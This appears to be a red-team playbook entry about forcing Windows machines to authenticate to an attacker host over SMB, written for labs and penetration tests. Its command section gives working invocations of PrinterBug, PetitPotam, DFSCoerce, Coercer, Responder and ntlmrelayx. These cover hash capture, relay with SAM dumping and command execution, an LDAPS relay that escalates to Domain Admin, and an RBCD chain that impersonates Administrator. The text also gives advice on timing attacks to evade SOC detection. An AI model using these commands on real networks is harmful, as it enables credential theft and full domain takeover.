title: SMB Forced Authentication — Coercion Techniques Overview
body:
Forced authentication (often called 'coercion') is the umbrella term for any technique that makes a remote Windows machine authenticate to a host you control — usually so you can capture the NTLMv2 hash with Responder, or relay the auth to another target with ntlmrelayx.

This node is the conceptual map. Each branch below has its own dedicated walkthrough node with the actual commands. Pick the technique that fits your access level and target context.

— THE FOUR FAMILIES OF COERCION —

  1. URI FILE ATTACKS (writable share required, low privilege)
     Drop a .url / .lnk / .scf / .library-ms file into a writable share.
     Windows Explorer pre-resolves the file's icon path the moment a user
     browses the parent folder. Icon path = UNC to your Kali = NTLMv2 leak.
     Best when: you have any writable SMB share but only basic credentials.
     Forward: smb_writable_uri_attack (full command walkthrough)

  2. RPC-LAYER COERCION (no share needed, valid creds required)
     Authenticated RPC calls force the target's machine account to authenticate
     to a UNC path. Several distinct exploit primitives:
       - PrinterBug (MS-RPRN)        — abuses the print spooler
       - PetitPotam (MS-EFSRPC)      — abuses the encrypting file system RPC
       - DFSCoerce (MS-DFSNM)        — abuses distributed file system RPC
       - ShadowCoerce (MS-FSRVP)     — abuses file server VSS RPC
     Best when: you have any domain credential and want to coerce a DC or
     specific server to authenticate to your relay/listener.

  3. WEB-LAYER COERCION (target has accessible Windows web service)
     IIS, SCCM, Exchange, and similar services can be coerced via XXE,
     UNC injection in URLs, or auth headers that resolve UNC paths.
     Examples: SQL xp_dirtree to UNC, IIS UNC tag injection, Exchange
     OWA pre-auth NTLM disclosure (CVE-2018-8581 era).
     Best when: the target exposes a web service you can interact with.

  4. EMAIL/CLIENT-SIDE COERCION (slow but reliable)
     A document with an external image reference, an Outlook reminder, or
     an HTML email triggers automatic NTLM auth on open. Slowest delivery
     vector but works in environments with no other foothold.
     Best when: you're in an external red-team engagement with email access
     or document delivery capability.

— WHAT YOU DO WITH THE CAPTURED AUTH —

  Two workflows, mutually exclusive at the Responder/ntlmrelayx level:

  CAPTURE → CRACK (Responder running, ntlmrelayx OFF)
    Captured NTLMv2 hash → john/hashcat with rockyou or rules.
    Works on any captured auth. Limited to crackable passwords.
    Lab boxes: rockyou cracks ~95% of the time.
    Real engagements: usually fails without rules + targeted wordlists.

  CAPTURE → RELAY (ntlmrelayx running, Responder SMB/HTTP OFF)
    Captured auth is forwarded directly to a target where SMB signing is
    not required. Outputs: SOCKS proxy, SAM dump, code execution.
    Works whether or not the password is crackable — you don't see the password,
    you ride the auth session. Requires a relay target with signing disabled.
    Check signing across the subnet first: nxc smb $range

— THE SIGNING REQUIREMENT — WHY IT MATTERS —

  SMB signing required → relay impossible (auth is rejected at the relay target)
  SMB signing optional → relay works
  SMB signing disabled → relay works

  Default Windows configuration:
    - Domain controllers: signing REQUIRED (cannot relay to DCs by default)
    - Member servers:    signing OPTIONAL (relay usually works)
    - Workstations:      signing OPTIONAL (relay usually works)

  The exception that makes engagements: misconfigured DCs without signing,
  or any non-DC where signing was explicitly disabled. nxc smb $range surfaces
  these in seconds.

— OPSEC NOTES —

  All forced-auth techniques generate event log entries on the target.
  Detection-relevant events:
    Event 4624/4625 (logon success/failure) on the target with anonymous logon
    Event 4648 (explicit credential use)
    Event 5145 (file share access) when URI files are accessed
    Spooler service errors when PrinterBug is used
    EFS-related events when PetitPotam is used

  On real engagements, time the coercion to high-noise periods (workday
  start, end-of-shift) to blend in. Lab boxes don't care.

— PICKING YOUR TECHNIQUE —

  Have writable share, no creds yet      → URI file attack
  Have any domain user creds             → PrinterBug / PetitPotam
  Have local web service access          → web-layer coercion
  Have email or document delivery        → client-side coercion
  Need to compromise a DC                 → coercion + relay to LDAP/LDAPS
  Need to compromise non-DC server       → coercion + relay to SMB
cmd:
# ── DECISION TREE ────────────────────────────────────
# This is an overview node — the actual command walkthroughs live in the
# forward-link nodes. Below are pointer commands for each technique family.

# ── FAMILY 1: URI FILE ATTACK ────────────────────────
# See smb_writable_uri_attack for the full step-by-step.
# Quick summary:
smbclient -N //$ip/SHARE -c 'put @hax.url'
sudo responder -I tun0 -wrf -v
# Wait for capture, crack with john

# ── FAMILY 2: RPC COERCION — PRINTERBUG ──────────────
# Requires: any domain user credential, target running Print Spooler service.
# Tools: dementor.py (Impacket), printerbug.py (Coercer fork), SpoolSample.exe

# Check if spooler is running first:
rpcdump.py @$target_ip 2>/dev/null | grep -E 'Spooler|MS-RPRN'
# Or simpler:
nxc smb $target_ip -u user -p pass -M spooler

# Coerce target to authenticate to your Kali:
impacket-printerbug 'domain/user:pass'@$target_ip $kali_ip
# Or with the standalone tool:
python3 dementor.py -d domain -u user -p pass $kali_ip $target_ip

# ── FAMILY 2: RPC COERCION — PETITPOTAM ──────────────
# Requires: any domain user credential (or sometimes anonymous, depending on patch level).
# Targets the EFSRPC interface — works against most Server 2016/2019/2022 DCs.

# Anonymous attempt (works pre-patch):
python3 PetitPotam.py -u '' -p '' $kali_ip $target_ip

# Authenticated (works post-patch on some configurations):
python3 PetitPotam.py -u user -p pass -d domain $kali_ip $target_ip

# Or via Coercer (multi-vector swiss army knife):
python3 Coercer.py coerce -u user -p pass -d domain.local -l $kali_ip -t $target_ip

# ── FAMILY 2: RPC COERCION — DFSCOERCE / SHADOWCOERCE ─
# Less commonly patched than PrinterBug/PetitPotam; sometimes the only path.

# DFSCoerce (MS-DFSNM):
python3 dfscoerce.py -u user -p pass -d domain $kali_ip $target_ip

# ShadowCoerce (MS-FSRVP):
python3 shadowcoerce.py -u user -p pass -d domain $kali_ip $target_ip

# Coercer.py auto-tries every technique:
python3 Coercer.py coerce -u user -p pass -d domain.local -l $kali_ip -t $target_ip --analyze

# ── CAPTURE OR RELAY — PICK ONE ──────────────────────

# OPTION A: CAPTURE (just want the hash)
# Edit /etc/responder/Responder.conf — SMB=On, HTTP=On
sudo responder -I tun0 -wrf -v
# Coerce target → wait for hash → crack offline

# OPTION B: RELAY (ride the auth without cracking)
# Edit /etc/responder/Responder.conf — SMB=Off, HTTP=Off
# (Responder must NOT eat the auth before ntlmrelayx sees it)

# Generate relay target list (machines with signing disabled):
nxc smb $subnet --gen-relay-list relay_targets.txt
# Or check manually:
nxc smb $subnet 2>&1 | grep -i 'signing:False'

# Start the relay:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# -socks       opens SOCKS proxy on 1080 — use proxychains for any tool
# -of <file>   dump SAM hashes from relayed targets
# -e <cmd>     execute command on relayed target
# -c <psh>     execute PowerShell payload

# Then trigger coercion (any of the above), and watch ntlmrelayx logs:
impacket-printerbug 'domain/user:pass'@$dc_ip $kali_ip

# ── RELAY TO LDAP — DC COMPROMISE WITHOUT KNOWING DA ─
# If LDAP signing is not required (older DC config), relay to LDAPS:
impacket-ntlmrelayx -t ldaps://$dc_ip --escalate-user yourlowpriv
# Then coerce a DC machine account → relayed to LDAPS as DC$ → DA via
# adding yourlowpriv to Domain Admins or DCSync rights.

# ── ENUMERATION — IS COERCION VIABLE HERE? ───────────
# Check spooler service across the domain:
nxc smb $subnet -u user -p pass -M spooler

# Check what services are vulnerable to coercion:
python3 Coercer.py scan -u user -p pass -d domain.local -t $target_ip

# Relay-target enumeration (signing disabled hosts):
nxc smb $subnet --gen-relay-list /tmp/relay.txt
wc -l /tmp/relay.txt

# Combined RBCD attack flow (when MAQ > 0):
# 1. Add a fake computer account (uses your MachineAccountQuota)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ssword123' \
  -dc-host $dc_ip 'domain/user:pass'
# 2. Coerce a target machine to authenticate to your relay
# 3. Relay grants RBCD on target with EVIL$ as the delegate
# 4. Get a service ticket as any user via S4U2Self/S4U2Proxy
impacket-getST -spn cifs/$target.domain.local 'domain/EVIL$:P@ssword123' \
  -impersonate Administrator
warn:
PICK CAPTURE OR RELAY — NEVER BOTH AT ONCE:
  Responder and ntlmrelayx both bind port 445 (and 80/443 for HTTP coercion).
  If both are running, whichever bound first eats every auth attempt and the
  other does nothing. The relay tool typically fails silently — you'll see
  Responder log the auth and assume relay is broken.
  Fix: edit /etc/responder/Responder.conf — set SMB=Off and HTTP=Off when
  using ntlmrelayx. Restart Responder for the change to take effect.

PRINTERBUG / PETITPOTAM PATCHES VARY BY KB:
  Microsoft has patched PetitPotam several times — KB5005413, KB5009610,
  others. Patches are partial and bypassable. Anonymous PetitPotam was
  killed; authenticated still works in many configurations. PrinterBug
  requires the spooler service running, which is enabled by default on
  Windows but admins increasingly disable it on DCs as hardening.
  Check before assuming: nxc smb $target -M spooler

DOMAIN CONTROLLERS HAVE SIGNING REQUIRED BY DEFAULT:
  You CAN'T relay captured DC auth back to another DC's SMB service —
  signing blocks it. But LDAPS may not require signing depending on config.
  Check both: nxc ldap $dc_ip and nxc smb $dc_ip
  If LDAPS shows signing:False or you can authenticate over LDAPS without
  channel binding, the LDAPS relay path is open. This is the canonical
  PetitPotam → ADCS ESC8 attack chain.

COERCION REQUIRES NETWORK ACCESS BACK TO YOUR KALI:
  The target machine must be able to reach your Kali on 445/tcp (and 80/443
  if doing HTTP coercion). On segmented networks this often fails silently:
  - Coerce command says success
  - Responder shows nothing
  - Diagnosis: target couldn't route back to your tun0 IP
  Test reachability first: ping from target if you have any shell, or check
  with a known-good UNC trigger (xp_dirtree from any SQL injection point).

MACHINE ACCOUNT QUOTA = ATTACK PRIMITIVE:
  Default MAQ on Windows is 10 — any authenticated user can add 10 computer
  accounts. This unlocks RBCD attacks where you create a fake computer,
  coerce a target, relay the auth, and configure RBCD on the target with
  your fake computer as the delegate. Result: full takeover of the target
  via S4U2Self → S4U2Proxy as Administrator.
  Check first: ADScout's Get-ADScoutMachineAccountQuota or:
    Get-ADObject -Identity ((Get-ADDomain).DistinguishedName) -Properties ms-DS-MachineAccountQuota

REAL-WORLD COERCION IS NOISY:
  Every coercion technique generates noise:
    - PrinterBug = spooler service errors logged on target
    - PetitPotam = EFS-related events
    - URI file = file share access events (5145)
    - Anonymous logon = 4624 with logon type 3, anonymous account
  Modern EDR (CrowdStrike, Defender for Endpoint, Sentinel rules) flags
  these events as part of standard NTLM relay detection. Plan accordingly
  for engagements with active SOC.

LABS DON'T HAVE EDR — REAL ENGAGEMENTS DO:
  PG, HTB, OSCP-style boxes have no behavioral detection. Coerce freely.
  On real engagements, time coercion to high-noise periods (start of
  business, end of shift) to blend with legitimate auth events. And ALWAYS
  document timestamps for the report — incident responders will ask.

choices.label: Writable SMB share — drop a URI file (full walkthrough)
Got NTLMv2 hash — crack with john/hashcat
Signing disabled elsewhere — relay instead of crack
Got domain creds — run BloodHound for AD path
Cracked password — log in via WinRM
Hash won't crack — try AS-REP roast or kerberoast
Captured DC machine account — relay to LDAPS
